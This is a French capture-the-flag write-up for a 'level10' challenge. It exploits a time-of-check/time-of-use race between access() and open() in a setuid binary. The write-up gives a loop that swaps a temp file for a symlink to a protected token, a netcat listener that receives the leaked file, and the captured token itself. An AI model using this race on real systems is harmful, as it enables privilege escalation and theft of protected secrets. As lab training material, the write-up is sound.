```bash
$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```

A nouveau, un fichier token mais cette fois ci pas lisible depuis notre utilisateur et un fichier avec le s-bit active.

```bash
$ ./level10
./level10 file host
        sends file to host if you have access to it
```

En regardant ce que fait le programme, on peut voir qu'il verifie si le fichier est accessible en lecture.
Si c'est le cas, il envoie le fichier a l'adresse IP fournie en argument sur le port 6969.

Malheureusement level10 n'a pas les droits pour lire le fichier token.

MAIS! Il existe une faille dans le programme, en etant assez rapide,
on peut faire en sorte que le programme lise le fichier token.

Explication du processus:
- On cree un fichier debile auquel level10 a acces dans /tmp
- Le programme execute la fonction access() sur le fichier debile et nous dit OK
- On remplace le fichier par un lien symbolique vers le fichier token
- Le programme execute la fonction open() sur le lien symbolique qui pointe desormais sur token
- Le ficher token est lu et envoye a l'adresse IP fournie en argument

```bash
// SHELL 1
$ while true; do ./level10 /tmp/ok localhost; done

// SHELL 2
$ while true; do rm -f /tmp/ok; touch /tmp/ok; rm -f /tmp/ok; ln -s /home/user/level10/token /tmp/ok; done

// SHELL 3
$ nc -lk 6969
...
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
...
```

On peut voir que le token est bien recu, et ainsi on peut se connecter au user flag10 et getflag :)
